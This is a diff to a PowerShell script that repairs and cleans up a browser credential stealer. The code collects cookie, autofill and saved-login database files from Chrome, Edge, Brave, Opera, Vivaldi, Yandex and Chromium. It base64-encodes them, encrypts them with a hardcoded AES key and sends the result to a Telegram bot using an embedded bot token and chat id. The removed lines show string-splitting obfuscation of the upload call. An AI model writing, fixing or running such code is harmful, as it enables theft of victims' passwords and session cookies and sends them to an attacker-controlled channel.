@@ -1,8 +1,11 @@
-$A1 = \"8065834690:AAE8me5r1T3TxRzPs-ucwHbjzHJzDuTQ8V0\"
-$B2 = \"7566413634\"
+$A1 = "8065834690:AAE8me5r1T3TxRzPs-ucwHbjzHJzDuTQ8V0"
+$B2 = "7566413634"
 
-Function Zz {{
-    param ([string]$D1, [string]$K1 = \"MySuperSecretKey123456\")
+Function Zz {
+    param (
+        [string]$D1,
+        [string]$K1 = "MySuperSecretKey123456"
+    )
     $C1 = New-Object System.Security.Cryptography.AesManaged
     $C1.Mode = [System.Security.Cryptography.CipherMode]::CBC
     $C1.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
@@ -16,79 +19,76 @@ Function Zz {{
     $M1.Write($F1, 0, $F1.Length)
     $R1 = $M1.ToArray()
     [Convert]::ToBase64String($R1)
-}}
+}
 
-Function Xx {{
+Function Xx {
     $P1 = @(
-        "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Cookies",
-        "$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Cookies",
-        "$env:LOCALAPPDATA\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Cookies",
-        "$env:APPDATA\\Opera Software\\Opera GX Stable\\Cookies",
-        $env:LOCALAPPDATA\\Vivaldi\\User Data\\Default\\Cookies,
-        $env:LOCALAPPDATA\\Chromium\\User Data\\Default\\Cookies
-        
-#AF
+        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies",
+        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies",
+        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Cookies",
+        "$env:APPDATA\Opera Software\Opera GX Stable\Cookies",
+        "$env:LOCALAPPDATA\Vivaldi\User Data\Default\Cookies",
+        "$env:LOCALAPPDATA\Chromium\User Data\Default\Cookies",
 
-        $env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Web Data,
-        $env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Web Data,
-        $env:LOCALAPPDATA\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Web Data,
-        $env:APPDATA\\Opera Software\\Opera GX Stable\\Web Data,
-        $env:APPDATA\\Opera Software\\Opera Stable\\Web Data,
-      	$env:LOCALAPPDATA\\Chromium\\User Data\\Default\\Web Data
-        $env:LOCALAPPDATA\\Vivaldi\\User Data\\Default\\Web Data    
-        $env:LOCALAPPDATA\\Chromium\\User Data\\Default\\Web Data
-  
-#PW
-    
-        $env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data
-        $env:LOCALAPPDATA\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data
-        $env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Login Data
-        $env:LOCALAPPDATA\\Opera Software\\Opera Stable\\Login Data
-        $env:LOCALAPPDATA\\Vivaldi\\User Data\\Default\\Login Data
-        $env:LOCALAPPDATA\\Yandex\\YandexBrowser\\User Data\\Default\\Login Data
-        $env:LOCALAPPDATA\\Chromium\\User Data\\Default\\Login Data    
-  
+        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Web Data",
+        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Web Data",
+        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Web Data",
+        "$env:APPDATA\Opera Software\Opera GX Stable\Web Data",
+        "$env:APPDATA\Opera Software\Opera Stable\Web Data",
+        "$env:LOCALAPPDATA\Vivaldi\User Data\Default\Web Data",
+        "$env:LOCALAPPDATA\Chromium\User Data\Default\Web Data",
+
+        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data",
+        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data",
+        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data",
+        "$env:LOCALAPPDATA\Opera Software\Opera Stable\Login Data",
+        "$env:LOCALAPPDATA\Vivaldi\User Data\Default\Login Data",
+        "$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data\Default\Login Data",
+        "$env:LOCALAPPDATA\Chromium\User Data\Default\Login Data"
     )
-    $Zz = \"\"
 
-    foreach ($Q1 in $P1) {{
-        if (Test-Path $Q1) {{
-            try {{
-                $Zz += ('='*3) + $Q1 + "`n"
+    $Zz = ""
+
+    foreach ($Q1 in $P1) {
+        if (Test-Path $Q1) {
+            try {
+                $Zz += ('=' * 3) + $Q1 + "`n"
                 $D2 = [System.IO.File]::ReadAllBytes($Q1)
-                if ($D2.Length -gt 4000) {{
-        $Zz += "Data too large to send, skipping..." + "`n"
-}} else {{
-        $Zz += [Convert]::ToBase64String($D2) + "`n"
-}}
-            catch {{
-                $Zz += ("err@:" + $Q1 + " - " + $_.Exception.Message + "`n") 
-}}
-            }}
-        }}
-    }}
+                if ($D2.Length -gt 4000) {
+                    $Zz += "Data too large to send, skipping..." + "`n"
+                } else {
+                    $Zz += [Convert]::ToBase64String($D2) + "`n"
+                }
+            } catch {
+                $Zz += ("err@:" + $Q1 + " - " + $_.Exception.Message + "`n")
+            }
+        }
+    }
     return $Zz
-}}
+}
 
-Function Yy {{
+Function Yy {
     param ([string]$Msg)
-    $b64 = 'aHR0cHM6Ly9hcGku' + 'dGVsZWdyYW0ub3Jn' + '/Ym90'
-    $url = [https://api.telegram.org/bot$8065834690:AAE8me5r1T3TxRzPs-ucwHbjzHJzDuTQ8V0/sendMessage]::UTF8.GetString(...)
 
-    $body = @{{ 
-        ('c'+'hat_id') = $B2
-        ('te'+'xt') = $Msg
-        ('pars'+'e_mode') = \"Markdown\"
-    }}
+    $uri = "https://api.telegram.org/bot$A1/sendMessage"
 
-    $IR = ('In'+'voke') + '-RestMethod'
-    $response = &($IR) -Uri $uri -Method Post -Body $body
-if ($response.ok -eq $false) {{
-    Write-Host "Failed to send message: $($response.description)"
-}}
-}}
+    $body = @{
+        "chat_id" = $B2
+        "text" = $Msg
+        "parse_mode" = "Markdown"
+    }
+
+    try {
+        $response = Invoke-RestMethod -Uri $uri -Method Post -Body $body
+        if ($response.ok -ne $true) {
+            Write-Host "Failed to send message: $($response.description)"
+        }
+    } catch {
+        Write-Host "Error sending message: $($_.Exception.Message)"
+    }
+}
 
 # Entry Point
 $DUMP = Xx
 $ENC = Zz -D1 $DUMP
-Yy -Msg ('Result:`n`n' + $ENC)
+Yy -Msg ("Result:`n`n" + $ENC)
